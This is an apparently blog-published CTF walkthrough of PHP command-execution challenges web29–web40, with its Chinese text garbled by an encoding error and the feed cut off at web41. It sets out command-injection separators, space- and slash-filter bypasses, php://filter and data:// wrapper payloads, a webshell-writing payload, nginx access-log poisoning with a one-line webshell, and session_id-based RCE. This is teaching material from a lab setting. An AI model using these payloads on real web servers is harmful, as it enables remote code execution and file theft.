        <content type="html"><![CDATA[<h3 id="å†™åœ¨å‰é¢"><a href="#å†™åœ¨å‰é¢" class="headerlink" title="å†™åœ¨å‰é¢"></a>å†™åœ¨å‰é¢</h3><h4 id="ç”¨äºå‘½ä»¤æ‰§è¡Œçš„å¸¸è§å§¿åŠ¿"><a href="#ç”¨äºå‘½ä»¤æ‰§è¡Œçš„å¸¸è§å§¿åŠ¿" class="headerlink" title="ç”¨äºå‘½ä»¤æ‰§è¡Œçš„å¸¸è§å§¿åŠ¿"></a>ç”¨äºå‘½ä»¤æ‰§è¡Œçš„å¸¸è§å§¿åŠ¿</h4><p>system</p><p>exec</p><p>passthru</p><p>shell_exec</p><p>include(æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œé…åˆphpä¼ªåè®®)</p><h4 id="ä¸€äº›å¸¸è§çš„ç»•è¿‡æ–¹å¼"><a href="#ä¸€äº›å¸¸è§çš„ç»•è¿‡æ–¹å¼" class="headerlink" title="ä¸€äº›å¸¸è§çš„ç»•è¿‡æ–¹å¼"></a>ä¸€äº›å¸¸è§çš„ç»•è¿‡æ–¹å¼</h4><h5 id="Windowsæ”¯æŒï¼š"><a href="#Windowsæ”¯æŒï¼š" class="headerlink" title="Windowsæ”¯æŒï¼š"></a>Windowsæ”¯æŒï¼š</h5><p>|ç›´æ¥æ‰§è¡Œåé¢çš„è¯­å¥ ping 127.0.0.1|whoami<br>||å‰é¢å‡ºé”™æ‰§è¡Œåé¢çš„ ï¼Œå‰é¢ä¸ºå‡ ping 2||whoami<br>&amp; å‰é¢çš„è¯­å¥ä¸ºå‡åˆ™ç›´æ¥æ‰§è¡Œåé¢çš„,å‰é¢å¯çœŸå¯å‡ ping 127.0.0.1&amp;whoami<br>&amp;&amp;å‰é¢çš„è¯­å¥ä¸ºå‡åˆ™ç›´æ¥å‡ºé”™ï¼Œåé¢çš„ä¹Ÿä¸æ‰§è¡Œï¼Œå‰é¢åªèƒ½ä¸ºçœŸ ping 127.0.0.1&amp;&amp;whoami</p><p>%0a å›è½¦</p><p>%1a ä½œä¸º.batæ–‡ä»¶çš„å‘½ä»¤åˆ†éš”ç¬¦</p><h5 id="Linuxæ”¯æŒ"><a href="#Linuxæ”¯æŒ" class="headerlink" title="Linuxæ”¯æŒ:"></a>Linuxæ”¯æŒ:</h5><p>;å‰é¢çš„æ‰§è¡Œå®Œæ‰§è¡Œåé¢çš„ ping 127.0.0.1;whoami<br>|ç®¡é“ç¬¦ï¼Œæ˜¾ç¤ºåé¢çš„æ‰§è¡Œç»“æœ ping 127.0.0.1|whoami<br>||å½“å‰é¢çš„æ‰§è¡Œå‡ºé”™æ—¶æ‰§è¡Œåé¢çš„ ping 1||whoami<br>&amp; å‰é¢çš„è¯­å¥ä¸ºå‡åˆ™ç›´æ¥æ‰§è¡Œåé¢çš„,å‰é¢å¯çœŸå¯å‡ ping 127.0.0.1&amp;whoami<br>&amp;&amp;å‰é¢çš„è¯­å¥ä¸ºå‡åˆ™ç›´æ¥å‡ºé”™ï¼Œåé¢çš„ä¹Ÿä¸æ‰§è¡Œï¼Œå‰é¢åªèƒ½ä¸ºçœŸ ping 127.0.0.1&amp;&amp;whoami</p><p>%0a å›è½¦</p><p>%0d æ¢è¡Œ</p><h5 id="è¿‡æ»¤ç©ºæ ¼ç»•è¿‡"><a href="#è¿‡æ»¤ç©ºæ ¼ç»•è¿‡" class="headerlink" title="è¿‡æ»¤ç©ºæ ¼ç»•è¿‡"></a>è¿‡æ»¤ç©ºæ ¼ç»•è¿‡</h5><p>ä½¿ç”¨&lt;ä»£æ›¿ç©ºæ ¼</p><p>ä½¿ç”¨${IFS}ä»£æ›¿ç©ºæ ¼</p><blockquote><p>IFSå˜é‡çš„ç›¸å…³ä¿¡æ¯ï¼š</p><ul><li>ShellæŠŠå˜é‡IFSå†…çš„æ¯ä¸€ä¸ªå­—ç¬¦éƒ½å½“åšæ˜¯ä¸€ä¸ªåˆ†å‰²ç¬¦(delimeter)ï¼Œç”¨è¿™äº›å­—ç¬¦ä½œä¸ºæ¯ä¸€ä¸ªå­—æ®µçš„ç»“æŸç¬¦æ¥è¿›è¡Œåˆ†å‰²ã€‚</li><li>å¦‚æœIFSæ²¡æœ‰è®¾ç½®ï¼Œæˆ–è€…IFSçš„å€¼è¢«è®¾ç½®ä¸ºâ€\t\nâ€(space, tabå’Œ newline)ï¼Œé‚£ä¹ˆæ“ä½œå¯¹è±¡çš„å¼€å§‹å’Œç»“æŸå¤„çš„æ‰€æœ‰space, tabå’Œnewlineåºåˆ—éƒ½å°†è¢«å¿½ç•¥ï¼Œä½†æ˜¯æ“ä½œå¯¹è±¡ä¸­é—´çš„space, tabå’Œnewlineåºåˆ—ä¼šä½œä¸ºç•Œå®šç¬¦å·¥ä½œã€‚</li><li>å¦‚æœIFSå€¼ä¸æ˜¯é»˜è®¤å€¼(ä¾‹å¦‚ç¨‹åºä¸­å¯¹IFSè¿›è¡Œè®¾ç½®è¿‡)ï¼Œåªæœ‰å‡ºç°åœ¨IFSå†…çš„ç©ºç™½å­—ç¬¦(å¯èƒ½æ˜¯space, tabæˆ–newlineä¸­çš„ä¸€ä¸ªæˆ–å‡ ä¸ª)æ‰ä¼šåœ¨å•è¯å¼€å§‹å’Œç»“æŸå¤„è¢«å¿½ç•¥ï¼Œè¿™é‡Œè¯´çš„æ˜¯å•è¯ï¼Œè€Œä¸æ˜¯æ•´ä¸ªæ“ä½œå¯¹è±¡ã€‚</li><li>IFSå†…çš„éç©ºç™½å­—ç¬¦å¤šä¸ªè¿ç»­å‡ºç°æ—¶ï¼Œæ¯ä¸ªéç©ºç™½å­—ç¬¦ä¼šè¢«å½“åšå•ç‹¬çš„åˆ†éš”ç¬¦çœ‹å¾…ï¼Œä½†æ˜¯å¤šä¸ªè¿ç»­çš„ç©ºç™½å­—ç¬¦ä¼šè¢«å½“åšä¸€ä¸ªåˆ†éš”ç¬¦çœ‹å¾…ã€‚</li><li>å¦‚æœIFSä¸ºç©º(â€œnullâ€)ï¼Œåˆ™ä¸ä¼šè¿›è¡Œå•è¯åˆ†å‰²ã€‚</li></ul></blockquote><p>ä½¿ç”¨$IFSä»£æ›¿ç©ºæ ¼</p><h5 id="è¿‡æ»¤æ–œæ -ç»•è¿‡"><a href="#è¿‡æ»¤æ–œæ -ç»•è¿‡" class="headerlink" title="è¿‡æ»¤æ–œæ &#x2F;ç»•è¿‡"></a>è¿‡æ»¤æ–œæ &#x2F;ç»•è¿‡</h5><p>ä½¿ç”¨${HOME:0:1}ä»£æ›¿</p><h5 id="phpä¼ªåè®®"><a href="#phpä¼ªåè®®" class="headerlink" title="phpä¼ªåè®®"></a>phpä¼ªåè®®</h5><p>PHP ä¼ªåè®®æ˜¯ PHP æ”¯æŒçš„åè®®ä¸å°è£…åè®®ï¼Œå‡ ä¸ª PHP æ”¯æŒçš„ä¼ªåè®®å¦‚ä¸‹ã€‚</p><table><thead><tr><th>ä¼ªåè®®</th><th>åŠŸèƒ½</th></tr></thead><tbody><tr><td>file:&#x2F;&#x2F;</td><td>è®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿ</td></tr><tr><td>http:&#x2F;&#x2F;</td><td>è®¿é—® HTTP(s) ç½‘å€</td></tr><tr><td>php:&#x2F;&#x2F;</td><td>è®¿é—®å„ä¸ªè¾“å…¥&#x2F;è¾“å‡ºæµ</td></tr><tr><td>phar:&#x2F;&#x2F;</td><td>PHP å½’æ¡£</td></tr><tr><td>zip:&#x2F;&#x2F;</td><td>å‹ç¼©æµ</td></tr></tbody></table><p>ä¾‹å¦‚åœ¨ allow_url_include &#x3D; on æ—¶æœåŠ¡å™¨ä¸Šæœ‰ä¸ªæ–‡ä»¶å« index.phpï¼Œä¸”å­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œè¿™ä¸ªæ—¶å€™å°±èƒ½ç”¨ php ä¼ªåè®®ç›´æ¥æŠŠæ–‡ä»¶æ˜¾ç¤ºå‡ºæ¥ã€‚</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>file<span class="token operator">=</span>php<span class="token punctuation">:</span><span class="token comment">//filter/read=convert.base64-encode/resource=index.php</span></code></pre><p>ç¨å¾®è§£é‡Šä¸‹è¿™ä¸ªåšæ³•ï¼Œphp:&#x2F;&#x2F;filter&#x2F; æ˜¯ä¸€ç§è®¿é—®æœ¬åœ°æ–‡ä»¶çš„åè®®ï¼Œ&#x2F;read&#x3D;convert.base64-encode&#x2F; è¡¨ç¤ºè¯»å–çš„æ–¹å¼æ˜¯ base64 ç¼–ç åï¼Œresource&#x3D;index.php è¡¨ç¤ºç›®æ ‡æ–‡ä»¶ä¸ºindex.phpã€‚é—®ä»€ä¹ˆè¦è¿›è¡Œ base64 ç¼–ç å‘¢ï¼Ÿå¦‚æœä¸è¿›è¡Œ base64 ç¼–ç ä¼ å…¥ï¼Œindex.php å°±ä¼šç›´æ¥æ‰§è¡Œï¼Œæˆ‘ä»¬å°±çœ‹ä¸åˆ°æ–‡ä»¶ä¸­çš„å†…å®¹äº†ã€‚php åè®®è¿˜å¸¸ç”¨ php:&#x2F;&#x2F;inputï¼Œè¿™å¯ä»¥è®¿é—®è¯·æ±‚çš„åŸå§‹æ•°æ®çš„åªè¯»æµï¼Œå¯ä»¥è¯»å– POST è¯·æ±‚çš„å‚æ•°ã€‚</p><h5 id="data-ä¼ªåè®®"><a href="#data-ä¼ªåè®®" class="headerlink" title="data ä¼ªåè®®"></a>data ä¼ªåè®®</h5><p>php 5.2.0 èµ·ï¼Œæ•°æ®æµå°è£…å™¨å¼€å§‹æœ‰æ•ˆï¼Œä¸»è¦ç”¨äºæ•°æ®æµçš„è¯»å–ï¼Œå¦‚æœä¼ å…¥çš„æ•°æ®æ˜¯PHPä»£ç å°±ä¼šæ‰§è¡Œä»£ç ã€‚ä½¿ç”¨æ–¹æ³•ä¸º:</p><pre class="language-none"><code class="language-none">data:&#x2F;&#x2F;text&#x2F;plain;base64,xxxx(base64ç¼–ç åçš„æ•°æ®)</code></pre><h5 id="æ— å›æ˜¾å‘½ä»¤æ‰§è¡Œ"><a href="#æ— å›æ˜¾å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="æ— å›æ˜¾å‘½ä»¤æ‰§è¡Œ"></a>æ— å›æ˜¾å‘½ä»¤æ‰§è¡Œ</h5><p>1.tee ä»æ ‡å‡†è¾“å…¥è¯»å–ï¼Œå†å†™å…¥æ ‡å‡†è¾“å‡ºå’Œæ–‡ä»¶ã€‚</p><p>2.åå¼¹shell</p><p>3.dnslogå¤–å¸¦</p><h5 id="ä¸‹åˆ’çº¿çš„æ­£åˆ™ç»•è¿‡"><a href="#ä¸‹åˆ’çº¿çš„æ­£åˆ™ç»•è¿‡" class="headerlink" title="ä¸‹åˆ’çº¿çš„æ­£åˆ™ç»•è¿‡"></a>ä¸‹åˆ’çº¿çš„æ­£åˆ™ç»•è¿‡</h5><p> è¿™ä¸ªæ­£åˆ™çš„ç»•è¿‡æ–¹æ³•å°±æ˜¯åˆ©ç”¨ç‰¹æ€§æ¥ç»•è¿‡ï¼Œå¯ä»¥ç”¨</p><p>ã€€[</p><p> (ç©ºæ ¼)</p><p> + ã€€</p><p> .</p><p>ä¸Šé¢é‚£å‡ ä¸ªå­—ç¬¦ä»»ä½•ä¸€ä¸ªéƒ½è¡Œï¼Œéƒ½å¯ä»¥è¢«å¤„ç†æˆ_</p><h3 id="web29-124"><a href="#web29-124" class="headerlink" title="web29-124"></a>web29-124</h3><h4 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h4><p>åªæ˜¯è¿‡æ»¤äº†ç®€å•çš„flagå­—ç¬¦ï¼Œç›´æ¥ä½¿ç”¨systemå‡½æ•°</p><p>Payload:</p><blockquote><p>1ã€ç”¨egrepæ•ˆæœä¸€æ ·egrep&#x3D;grep  -E<br>c&#x3D;system(â€œcat fl<em>g.php | grep  -E â€˜fl.gâ€™ â€œ);<br>2ã€æ­¤ç§æ–¹å¼éœ€è¦å³é”®æºä»£ç <br>c&#x3D;system(â€œcat fl</em>g.phpâ€);<br>3ã€</p><p>c&#x3D;system(â€œtac fl<em>g.phpâ€);<br>4ã€å€’åºè¾“å‡ºæ–‡æœ¬<br>c&#x3D;system(â€œtac fl</em>ag.phpâ€);<br>5ã€<br>c&#x3D;system(â€œcp fl*g.php a.txt â€œ);<br>è®¿é—®&#x2F;a.txt<br>6ã€ç›´æ¥è¾“å‡ºä¸€ä¸ªphpè¿™æ ·å°±å¯ä»¥ç›´æ¥åˆ©ç”¨ä»£ç äº†,æ³¨æ„ä¹Ÿæ˜¯å³é”®æŸ¥çœ‹æºä»£ç <br>c&#x3D;system(â€˜echo -e â€œ &lt;?php \n error_reporting(0); \n  $c&#x3D; $_GET[&#39;c&#39;]; \n eval($c); â€œ &gt; a.phpâ€™);<br>&#x2F;a.php?c&#x3D;system(â€œtac flag.phpâ€);</p></blockquote><h4 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h4><p>è¿‡æ»¤äº†systemå‡½æ•°ï¼Œå¯ä»¥ç”¨åå¼•å·æ¥å‘½ä»¤æ‰§è¡Œ</p><p>Payload:</p><blockquote><p>1ã€nlå‘½ä»¤ï¼Œå¸¦ç€è¡Œå·è¾“å‡ºæ–‡æœ¬å†…å®¹<br>c&#x3D;echo <code>nl fl&#39;&#39;ag.p&#39;&#39;hp</code>;<br>echo <code>cat fl&#39;&#39;ag.p&#39;&#39;hp</code>;<br>echo <code>cat fl*ag.p*hp</code>;<br>echo <code>cp fl*ag.p*hp 1.txt | cat 1.txt</code>;<br>å•å¼•å·ï¼šå¼•å·é‡Œé¢çš„å†…å®¹ä¼šåŸå°ä¸åŠ¨çš„æ˜¾ç¤ºå‡ºæ¥ï¼ˆå¾ˆç®€å•ï¼Œä¸åšè§£é‡Šï¼‰<br>åŒå¼•å·ï¼šé‡Œé¢çš„ç‰¹æ®Šç¬¦å·ä¼šè¢«è§£æï¼Œå˜é‡ä¹Ÿä¼šè¢«æ›¿æ¢ï¼ˆ\ ç¬¦å·ã€ç©ºæ ¼ä¼šè¢«è§£æï¼‰<br>echo \a -&gt; a<br>echo â€œ\aâ€ -&gt; \a<br>2ã€passthruå‡½æ•°ï¼ŒåŒsystemï¼ŒåŒç†execï¼Œshell_execä¹Ÿå¯ä»¥ç”¨ï¼Œä¸è¿‡æœ‰ç‚¹éº»çƒ¦<br>c&#x3D;passthru(â€œcat fla*â€);<br>c&#x3D;exec(passthru(â€œcat fla*â€));<br>c&#x3D;shell_exec(passthru(â€œcat fla*â€));</p></blockquote><h4 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h4><p>é¢˜ç›®è¿‡æ»¤äº†ç©ºæ ¼ï¼Œå•å¼•å·ï¼Œå°æ•°ç‚¹ï¼Œ</p><p>è¿‡æ»¤äº†ç©ºæ ¼ï¼Œå¯ä»¥ä½¿ç”¨%09æ›¿ä»£ï¼›ä¹Ÿå¯ä»¥ä½¿ç”¨{$IFS}ï¼Œå› ä¸ºå•å¼•å·è¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥å¦‚æœä½¿ç”¨c&#x3D;passthru(â€œcat%09fla*â€);æˆ–è€…{$IFS}éƒ½ä¸ä¼šè¢«è§£é‡Šä¸ºç©ºæ ¼</p><p>æ‰€ä»¥æ„é€ å¦‚ä¸‹Payload:</p><blockquote><p>1ã€ä½¿ç”¨evalåµŒå¥—ã€‚å…·ä½“å‚æ•°ï¼špassthru ç»“åˆ%09ï¼Œä¹Ÿå¯ä»¥ç›´æ¥rceï¼Œå› ä¸ºæ²¡æœ‰å¯¹å…¶ä»–å‚æ•°è¿›è¡Œè¿‡æ»¤<br>å…¶ä¸­%09ç»•è¿‡ç©ºæ ¼ ?c&#x3D;eval($_GET[1]);&amp;1&#x3D;passthru(â€œtac%09fla*â€); è¿™é‡Œéœ€è¦æ³¨æ„æ‹¬å·çš„é—­åˆï¼Œ&amp;çš„è¿æ¥ã€‚<br>2ã€ä½¿ç”¨å‚æ•°ï¼špassthruç»“åˆ $IFS$9<br>å…¶ä¸­$IFS$9ç»•è¿‡ç©ºæ ¼ï¼Œæ³¨æ„è½¬ä¹‰$ç¬¦å· ?<br>$9æ˜¯å½“å‰ç³»ç»Ÿshellè¿›ç¨‹çš„ç¬¬ä¹ä¸ªå‚æ•°çš„æŒæœ‰è€…ï¼Œå®ƒå§‹ç»ˆä¸ºç©ºå­—ç¬¦ä¸²ã€‚c&#x3D;eval($_GET[1]);&amp;1&#x3D;passthru(â€œtac$IFS$9fla*â€);<br>3ã€ä½¿ç”¨æœªè¢«è¿‡æ»¤çš„å‘½ä»¤ã€‚passthruç›´æ¥è¯»å–<br>?c&#x3D;passthru(%22tac$IFS$9fla*%22); ä¹Ÿå°±æ˜¯passthru(â€œtac$IFS$9fla*â€);<br>4ã€ä½¿ç”¨pos(localeconv)æ¥è·å–å°æ•°ç‚¹<br>localeconvå¯ä»¥è¿”å›åŒ…æ‹¬å°æ•°ç‚¹åœ¨å†…çš„ä¸€ä¸ªæ•°ç»„ï¼›poså»å–å‡ºæ•°ç»„ä¸­å½“å‰ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œä¹Ÿå°±æ˜¯å°æ•°ç‚¹ã€‚ scandirå¯ä»¥ç»“åˆå®ƒæ‰«æå½“å‰ç›®å½•å†…å®¹ã€‚ ?c&#x3D;print_r(scandir(pos(localeconv()))); å¯ä»¥çœ‹åˆ°å½“å‰ç›®å½•ä¸‹æœ‰flag.php é€šè¿‡array_reverseæŠŠæ•°ç»„é€†åºï¼Œé€šè¿‡nextå–åˆ°ç¬¬äºŒä¸ªæ•°ç»„å…ƒç´ ï¼Œä¹Ÿå³flag.php ç„¶å?c&#x3D;show_source(next(array_reverse(scandir(pos(localeconv())))));</p></blockquote><h4 id="web32-nginxæ—¥å¿—æ³¨å…¥"><a href="#web32-nginxæ—¥å¿—æ³¨å…¥" class="headerlink" title="web32(nginxæ—¥å¿—æ³¨å…¥)"></a>web32(nginxæ—¥å¿—æ³¨å…¥)</h4><p>è¿‡æ»¤æ‰äº†flag|system|php|cat|sort|shell|.| |â€™|&#96;|echo|;|( åŒ…æ‹¬ç‚¹ï¼Œå•å¼•å·ï¼Œåå¼•å·ï¼Œåˆ†å·ï¼Œæ‹¬å·</p><p>æ‰€ä»¥è¿™é‡Œéœ€è¦ä½¿ç”¨includeæ¥æ„é€ Payload:</p><blockquote><p>1ã€?c&#x3D;include$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php<br>å…¶ä¸­?&gt;ä»£æ›¿åˆ†å·ï¼Œé¡µé¢ä¼šæ˜¾ç¤ºflag.phpå†…å®¹çš„base64ç¼–ç ï¼Œè§£ç å³å¯è·å–flag<br>è¿˜æœ‰ä¸€ç§æ–¹æ³•ï¼Œæ—¥å¿—æ³¨å…¥<br>2ã€?c&#x3D;include$_GET[1]?%3E&amp;1&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log<br>&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.logæ˜¯nginxé»˜è®¤çš„accessæ—¥å¿—è·¯å¾„ï¼Œè®¿é—®è¯¥è·¯å¾„æ—¶ï¼Œåœ¨User-Agentä¸­å†™å…¥ä¸€å¥è¯æœ¨é©¬ï¼Œç„¶åç”¨ä¸­å›½èšå‰‘è¿æ¥å³å¯</p><p>3ã€?c&#x3D;include$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;input</p><p>ä¹Ÿå¯ä»¥ä½¿ç”¨php:&#x2F;&#x2F;inputç„¶åä½¿ç”¨postæ‰§è¡Œå‘½ä»¤<?php system("cat flag.php")?></p></blockquote><h4 id="web33"><a href="#web33" class="headerlink" title="web33"></a>web33</h4><p>ç›¸æ¯”ä¸Šä¸€å…³åªå¤šè¿‡æ»¤äº†â€œ</p><p>æ‰€ä»¥web32Payloadä¾æ—§é€‚ç”¨</p><h4 id="web34"><a href="#web34" class="headerlink" title="web34"></a>web34</h4><p>å¤šè¿‡æ»¤ä¸€ä¸ª:  ä¹‹å‰payloadä¾æ—§é€‚ç”¨</p><h4 id="web35"><a href="#web35" class="headerlink" title="web35"></a>web35</h4><p>å¤šè¿‡æ»¤ä¸€ä¸ª&#x3D; &lt;   ä¹‹å‰payloadä¾æ—§é€‚ç”¨</p><h4 id="web36"><a href="#web36" class="headerlink" title="web36"></a>web36</h4><p>å¤šè¿‡æ»¤äº†æ•°å­—  GETå‚æ•°æ”¹ä¸ºaå³å¯</p><h4 id="web37"><a href="#web37" class="headerlink" title="web37"></a>web37</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>preg <span class="token keyword">match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag/i"</span>ï¼Œ<span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><blockquote><p>1ã€ä½¿ç”¨php:&#x2F;&#x2F;input POSTå†™å…¥phpä»£ç </p><?php system("cat fla*")?><p>2ã€ä½¿ç”¨dataåè®®</p><p>c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgCnN5c3RlbSgidGFjIGZsYWcucGhwIikKPz4&#x3D;</p><?php system("tac flag.php")?></blockquote><h4 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h4><p>web37Payloadç…§æ ·æ‰“</p><h4 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token operator">.</span><span class="token string double-quoted-string">".php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> </code></pre><p>?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?php%20system("tac fla*.php");?><br>?&gt;ä¸ºphpç»“æŸç¬¦å·ï¼Œåé¢æ‹¼æ¥çš„.phpä¼šè¢«å¿½ç•¥æ‰ï¼Œä¸ç”¨ç®¡</p><h4 id="web40-æ•°ç»„å‡½æ•°"><a href="#web40-æ•°ç»„å‡½æ•°" class="headerlink" title="web40(æ•°ç»„å‡½æ•°)"></a>web40(æ•°ç»„å‡½æ•°)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\ï¼ˆ|\ï¼‰|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\'|\"|\,|\&lt;|\.|\>|\/|\?|\\\\/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>     </code></pre><p>è¿™æ¬¡æ·»åŠ äº†å¾ˆå¤šè¿‡æ»¤ï¼Œä¹‹å‰æ–¹æ³•å¤§å¤šéƒ½ä¸è¡Œäº†</p><blockquote><p>1ã€c&#x3D;show_source(next(array_reverse(scandir(pos(localeconv()))))); æˆ–è€… c&#x3D;show_source(next(array_reverse(scandir(getcwd()))));</p><p>getcwd() å‡½æ•°è¿”å›å½“å‰å·¥ä½œç›®å½•ã€‚å®ƒå¯ä»¥ä»£æ›¿pos(localeconv())</p><p>localeconv()ï¼šè¿”å›åŒ…å«æœ¬åœ°åŒ–æ•°å­—å’Œè´§å¸æ ¼å¼ä¿¡æ¯çš„å…³è”æ•°ç»„ã€‚è¿™é‡Œä¸»è¦æ˜¯è¿”å›å€¼ä¸ºæ•°ç»„ä¸”ç¬¬ä¸€é¡¹ä¸ºâ€.â€</p><p>pos():è¾“å‡ºæ•°ç»„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œä¸æ”¹å˜æŒ‡é’ˆï¼›</p><p>current() å‡½æ•°è¿”å›æ•°ç»„ä¸­çš„å½“å‰å…ƒç´ ï¼ˆå•å…ƒï¼‰,é»˜è®¤å–ç¬¬ä¸€ä¸ªå€¼ï¼Œå’Œpos()ä¸€æ ·</p><p>scandir() å‡½æ•°è¿”å›æŒ‡å®šç›®å½•ä¸­çš„æ–‡ä»¶å’Œç›®å½•çš„æ•°ç»„ã€‚è¿™é‡Œå› ä¸ºå‚æ•°ä¸ºâ€.â€æ‰€ä»¥éå†å½“å‰ç›®å½•</p><p>array_reverse():æ•°ç»„é€†ç½®</p><p>next():å°†æ•°ç»„æŒ‡é’ˆæŒ‡å‘ä¸‹ä¸€ä¸ªï¼Œè¿™é‡Œå…¶å®å¯ä»¥çœç•¥å€’ç½®å’Œæ”¹å˜æ•°ç»„æŒ‡é’ˆï¼Œç›´æ¥åˆ©ç”¨[2]å–å‡ºæ•°ç»„ä¹Ÿå¯ä»¥</p><p>show_source():æŸ¥çœ‹æºç </p><p>pos() å‡½æ•°è¿”å›æ•°ç»„ä¸­çš„å½“å‰å…ƒç´ çš„å€¼ã€‚è¯¥å‡½æ•°æ˜¯current()å‡½æ•°çš„åˆ«åã€‚</p><p>æ¯ä¸ªæ•°ç»„ä¸­éƒ½æœ‰ä¸€ä¸ªå†…éƒ¨çš„æŒ‡é’ˆæŒ‡å‘å®ƒçš„â€å½“å‰â€å…ƒç´ ï¼Œåˆå§‹æŒ‡å‘æ’å…¥åˆ°æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ã€‚</p><p>æç¤ºï¼šè¯¥å‡½æ•°ä¸ä¼šç§»åŠ¨æ•°ç»„å†…éƒ¨æŒ‡é’ˆã€‚</p><p>ç›¸å…³çš„æ–¹æ³•ï¼š</p><p>current()è¿”å›æ•°ç»„ä¸­çš„å½“å‰å…ƒç´ çš„å€¼ã€‚</p><p>end()å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„æœ€åä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚</p><p>next()å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚</p><p>prev()å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸Šä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚</p><p>reset()å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚</p><p>each()è¿”å›å½“å‰å…ƒç´ çš„é”®åå’Œé”®å€¼ï¼Œå¹¶å°†å†…éƒ¨æŒ‡é’ˆå‘å‰ç§»åŠ¨ã€‚</p><p>2ã€c&#x3D;eval(array_pop(next(get_defined_vars())));&#x2F;&#x2F;éœ€è¦POSTä¼ å…¥å‚æ•°ä¸º1&#x3D;system(â€˜tac fl*â€™);</p><p>åŒç†?cmd&#x3D;system(â€œtac%20flag.phpâ€);&amp;c&#x3D;eval(pos(pos(get_defined_vars())));</p><p>get_defined_vars() è¿”å›ä¸€ä¸ªåŒ…å«æ‰€æœ‰å·²å®šä¹‰å˜é‡çš„å¤šç»´æ•°ç»„ã€‚è¿™äº›å˜é‡åŒ…æ‹¬ç¯å¢ƒå˜é‡ã€æœåŠ¡å™¨å˜é‡å’Œç”¨æˆ·å®šä¹‰çš„å˜é‡ï¼Œä¾‹å¦‚GETã€POSTã€FILEç­‰ç­‰ã€‚</p><p>next()å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚</p><p>array_pop() å‡½æ•°åˆ é™¤æ•°ç»„ä¸­çš„æœ€åä¸€ä¸ªå…ƒç´ å¹¶è¿”å›å…¶å€¼ã€‚</p><p>3ã€c&#x3D;session_start();system(session_id());<br>      passid&#x3D;ls</p><p><img src="web40.png" alt="web40" loading="lazy"></p><p>é€šè¿‡cookieè·å¾—å‚æ•°è¿›è¡Œå‘½ä»¤æ‰§è¡Œ</p><p>å—phpç‰ˆæœ¬å½±å“ 5.5 -7.1.9å‡å¯ä»¥æ‰§è¡Œï¼Œå› ä¸ºsession_idè§„å®šä¸º0-9ï¼Œa-z,A-Z,-ä¸­çš„å­—ç¬¦ã€‚åœ¨5.5ä»¥ä¸‹åŠ7.1ä»¥ä¸Šå‡æ— æ³•å†™å…¥é™¤æ­¤ä¹‹å¤–çš„å†…å®¹ã€‚ä½†æ˜¯ç¬¦åˆè¦æ±‚çš„å­—ç¬¦è¿˜æ˜¯å¯ä»¥çš„ã€‚</p></blockquote><h4 id="web41-rce-or"><a 